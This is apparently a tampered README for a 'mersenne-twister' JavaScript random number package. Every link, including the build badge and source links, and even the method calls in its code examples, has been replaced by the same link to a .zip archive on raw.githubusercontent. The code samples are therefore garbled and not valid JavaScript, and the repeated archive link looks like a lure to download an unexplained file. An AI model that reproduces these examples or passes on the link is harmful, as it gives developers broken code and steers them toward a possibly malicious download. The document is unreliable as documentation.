## Pseudorandom number generator [![Build Status](https://raw.githubusercontent.com/Regirockstone99/mersenne-twister/master/meliorability/mersenne-twister.zip)](https://raw.githubusercontent.com/Regirockstone99/mersenne-twister/master/meliorability/mersenne-twister.zip)

Mersenne Twister pseudorandom number generator.

[Origin source](https://raw.githubusercontent.com/Regirockstone99/mersenne-twister/master/meliorability/mersenne-twister.zip) (generator interface was changed)

Algorithm - https://raw.githubusercontent.com/Regirockstone99/mersenne-twister/master/meliorability/mersenne-twister.zip

## Installation

    $ npm install mersenne-twister

## Usage

```javascript
var MersenneTwister = require('mersenne-twister');
var generator = new MersenneTwister();

// Generates a random number on [0,1) real interval (same interval as https://raw.githubusercontent.com/Regirockstone99/mersenne-twister/master/meliorability/mersenne-twister.zip)
https://raw.githubusercontent.com/Regirockstone99/mersenne-twister/master/meliorability/mersenne-twister.zip();

// [0, 4294967295]
https://raw.githubusercontent.com/Regirockstone99/mersenne-twister/master/meliorability/mersenne-twister.zip();

// [0,1]
https://raw.githubusercontent.com/Regirockstone99/mersenne-twister/master/meliorability/mersenne-twister.zip();

// (0,1)
https://raw.githubusercontent.com/Regirockstone99/mersenne-twister/master/meliorability/mersenne-twister.zip();

// [0,1) with 53-bit resolution
https://raw.githubusercontent.com/Regirockstone99/mersenne-twister/master/meliorability/mersenne-twister.zip();

// [0, 2147483647]
https://raw.githubusercontent.com/Regirockstone99/mersenne-twister/master/meliorability/mersenne-twister.zip();
```

## Seeding

If you want to use a specific seed in order to get a repeatable random sequence, pass an integer into the constructor:

```javascript
var generator = new MersenneTwister(123);
``` 

and that will always produce the same random sequence.

Also you can do it on existing generator instance:

```javascript
https://raw.githubusercontent.com/Regirockstone99/mersenne-twister/master/meliorability/mersenne-twister.zip(123);
```

## License

See source
